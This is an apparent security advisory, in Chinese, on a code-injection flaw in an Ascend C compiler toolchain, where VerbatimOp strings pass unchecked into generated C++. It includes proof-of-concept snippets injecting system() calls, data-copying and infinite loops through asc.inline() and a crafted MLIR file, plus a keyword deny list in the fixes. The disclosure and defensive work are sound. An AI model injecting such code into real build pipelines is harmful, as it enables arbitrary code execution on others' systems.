# VULN-CROSS-002：VerbatimOp跨模块代码注入链漏洞

## 漏洞概述

**漏洞类型**: 代码注入链  
**CWE**: CWE-94 (Improper Control of Generation of Code)  
**严重程度**: Critical  
**置信度**: 85%

### 影响范围

跨模块代码注入链涉及多个模块：
- **language/core/ops.py**: Python DSL 提供 `asc.inline()` API
- **pybind_bindings/OpBuilder.cpp**: pybind11 绑定创建 VerbatimOp
- **emitasc_dialect**: EmitAsc::VerbatimOp 定义
- **ascendc_target/EmitAsc.cpp**: 代码发射，直接输出到 C++ 代码
- **cli_tools**: CLI 工具处理 MLIR 文件

### 漏洞描述

VerbatimOp 跨模块代码注入链: Python DSL (`asc.inline`) 或 CLI 工具 (`ascir-translate`) 处理 MLIR 文件中的 VerbatimOp，代码字符串直接输出到生成的 Ascend C 代码中，无任何验证。

---

## 完整攻击链分析

### 攻击路径 1: Python DSL → VerbatimOp → 生成的 C++ 代码

```
[攻击者编写 Python DSL 代码]
    ↓
language/core/ops.py → asc.inline("恶意 C++ 代码")
    ↓
[pybind_bindings: OpBuilder.cpp]
builder.create_emitc_VerbatimOp(恶意字符串)
    ↓
[MLIR IR: emitc.verbatim "恶意代码"]
    ↓
[ascendc_target: Emitc.cpp:49-52]
emitter.ostream() << verbatimOp.getValue()
    ↓
[生成的 Ascend C 代码包含恶意 C++]
    ↓
[编译器编译并执行恶意代码]
```

### 攻击路径 2: MLIR 文件 → CLI 工具 → 生成的 C++ 代码

```
[攻击者创建恶意 MLIR 文件]
emitc.verbatim "恶意 C++ 代码"
    ↓
[cli_tools: ascir-translate 处理 MLIR]
    ↓
[ascendc_target: Translation.cpp]
emitOperation → printOperation(verbatimOp)
    ↓
[Emitc.cpp:49-52]
emitter.ostream() << op.getValue()
    ↓
[恶意 C++ 代码输出到 Ascend C 文件]
    ↓
[编译执行]
```

### 关键代码片段

```cpp
// lib/Target/AscendC/External/Emitc.cpp:49-52
LogicalResult mlir::printOperation(CodeEmitter &emitter, emitc::VerbatimOp verbatimOp) {
    emitter.ostream() << verbatimOp.getValue();  // 直接输出用户字符串
    return success();
}

// lib/Target/AscendC/EmitAsc.cpp:189-227
LogicalResult mlir::emitasc::printOperation(CodeEmitter &emitter, emitasc::VerbatimOp op) {
    auto code = op.getValue();
    if (args.empty()) {
        os << code;  // 直接输出
        return success();
    }
    // 模板替换后输出
    os << result;
}
```

```python
# python/src/OpBuilder.cpp:765-766 (pybind11 绑定)
.def("create_emitc_VerbatimOp",
     [](PyOpBuilder &self, const std::string &str) {
         self.create<emitc::VerbatimOp>(StringRef(str));  // 直接传递用户字符串
     })
```

---

## PoC 构造思路

### 方法 1: 通过 Python DSL

```python
import asc

@asc.jit
def malicious_kernel(x):
    # 注入恶意 C++ 代码
    asc.inline("""
    // 恶意代码在生成的 Ascend C 中执行
    system("id > /tmp/pwned");
    
    // 数据窃取
    memcpy(attacker_buffer, kernel_input, sizeof(kernel_input));
    
    // 逻辑破坏
    while(true) {}  // 永久阻塞
    """)
    return x

# 运行 kernel，触发编译和执行
malicious_kernel(input_tensor)
```

### 方法 2: 通过恶意 MLIR 文件

```mlir
// malicious.mlir
module {
  func.func @attack_kernel(%arg0: tensor<1024xf32>) -> tensor<1024xf32> {
    // VerbatimOp 直接嵌入恶意 C++ 代码
    emitc.verbatim "system(\"id > /tmp/pwned\");"
    return %arg0 : tensor<1024xf32>
  }
}
```

```bash
# 使用 CLI 工具翻译
ascir-translate malicious.mlir > output.cpp

# output.cpp 包含恶意 C++ 代码
# 编译 output.cpp 并执行
```

---

## 利用条件分析

| 条件 | 要求 | 说明 |
|------|------|------|
| 攻击者位置 | 本地/远程 | 可通过 Python 脚本或 MLIR 文件 |
| 权限要求 | 无 | 只需能提供输入代码 |
| 用户交互 | 无 | JIT 编译自动触发 |
| 触发时机 | 编译阶段 | MLIR → Ascend C 翻译时 |

---

## 影响分析

### 安全影响

1. **任意 C++ 代码执行**: 恶意代码在 NPU 上执行
2. **数据窃取**: 可访问 kernel 输入输出数据
3. **逻辑破坏**: 可破坏 kernel 执行逻辑
4. **供应链攻击**: 污染的 MLIR 文件可影响其他用户

### CVSS 评分分析

- **Attack Vector (AV)**: Local (L) - Python DSL/MLIR 文件
- **Attack Complexity (AC)**: Low (L)
- **Privileges Required (PR)**: None (N)
- **User Interaction (UI)**: Required (R) - 需要运行恶意代码
- **Scope (S)**: Changed (C)
- **CIA Impact**: High/High/High

---

## 修复建议

### 优先级 1: 代码内容白名单验证

```cpp
// 定义允许的 VerbatimOp 内容
std::set<std::string> ALLOWED_VERBATIM_PATTERNS = {
    "// comment only",
    "/* block comment */",
    // 其他安全的模式
};

LogicalResult validateVerbatimContent(StringRef code) {
    // 检查危险关键字
    if (code.contains("system") || code.contains("exec") ||
        code.contains("fork") || code.contains("memcpy") ||
        code.contains("while(true)") || code.contains("while (true)")) {
        return failure();
    }
    
    // 检查函数调用
    if (code.contains("(") && code.contains(";")) {
        // 可能是函数调用，需要更严格验证
        // 只允许特定函数
    }
    
    return success();
}
```

### 优先级 2: 禁用 VerbatimOp 或限制使用场景

```python
# 在安全模式下禁用 asc.inline
SECURITY_MODE = True

def inline(code: str):
    if SECURITY_MODE:
        raise RuntimeError("asc.inline() is disabled in security mode")
    
    # 正常实现...
```

### 优先级 3: 代码沙箱执行

```cpp
// 在受限环境中执行生成的代码
// 使用 Ascend C 的安全 API 限制危险操作

LogicalResult sanitizeVerbatimCode(StringRef code, std::string& sanitized) {
    // 移除危险函数调用
    // 替换为安全的 API
    sanitized = code.str();
    
    // 移除 system/exec 等调用
    // ...
    
    return success();
}
```

---

## 相关漏洞

- **VULN-SEC-INC-001**: VerbatimOp 定义允许任意代码
- **VULN-SEC-INC-002**: CallOpaqueOp 任意函数调用
- **VULN-SEC-PYBIND-001/002**: pybind11 绑定直接传递字符串
- **VULN-SEC-CI-001/002**: 代码发射器直接输出用户字符串
- **VULN-SEC-EMITASC-003**: VerbatimOp 操作定义